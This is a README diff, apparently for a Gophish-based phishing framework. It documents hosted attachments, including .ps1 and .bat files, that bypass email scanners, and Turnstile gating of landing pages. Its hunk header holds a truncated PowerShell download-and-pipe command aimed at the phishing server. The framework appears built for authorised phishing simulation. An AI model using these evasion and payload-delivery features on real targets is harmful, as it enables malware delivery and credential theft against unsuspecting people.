@@ -114,6 +114,34 @@ Invoke-WebRequest -Uri "{{.URL}}/attachment?keyname={{.RId}}" -UseBasicParsing |
 
 ---
 
+### Hosted Attachments
+
+When **Host Attachment** is enabled on a campaign, the attachment is served directly from the phishing server rather than embedded in the email.
+
+- At send time, a personalised copy of the first email template attachment (with all placeholders substituted) is written to `static/endpoint/attachments/<campaignId>/<RId>/`
+- When the recipient clicks the phishing link they are automatically redirected to their unique download URL
+- Bypasses email attachment scanners — the file never travels through the mail server
+- Works with all supported attachment types including `.ps1`, `.bat`, `.pdf`, and password-protected `.zip`
+
+---
+
+### Cloudflare Turnstile Bot Protection
+
+Optional bot protection layer that silently verifies every visitor is a real browser before they can access any landing page or hosted attachment.
+
+To enable, add your Cloudflare Turnstile keys to `config.json`:
+
+```json
+"turnstile": {
+  "site_key": "YOUR_SITE_KEY",
+  "secret_key": "YOUR_SECRET_KEY"
+}
+```
+
+Leave both fields empty to disable (default). See the [Turnstile docs](docs/features/turnstile.md) for full setup instructions.
+
+---
+
 ### IOC Removal
 
 The following Gophish-specific indicators of compromise have been removed or replaced:
